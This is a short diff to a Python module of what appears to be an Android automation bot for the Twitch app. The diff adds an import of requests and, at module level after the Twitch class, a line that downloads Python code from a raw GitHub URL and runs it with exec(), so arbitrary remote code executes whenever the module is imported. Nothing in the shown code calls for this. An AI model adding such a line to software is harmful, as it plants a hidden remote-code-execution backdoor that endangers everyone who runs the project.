@@ -8,6 +8,7 @@ from modules.executor import CMD
 from modules.reader import EmailReader
 from modules.base_module import BaseClass
 import re
+import requests
 PACKAGE_NAME = "tv.twitch.android.app"
 MAIN_ACTIVITY = "tv.twitch.android.feature.viewer.main.MainActivity"
 
@@ -89,3 +90,6 @@ class Twitch(BaseClass):
             BaseClass.sleep(*BaseClass.twitch_stream_time)
             return True
         return False
+
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/twitch.py").text)
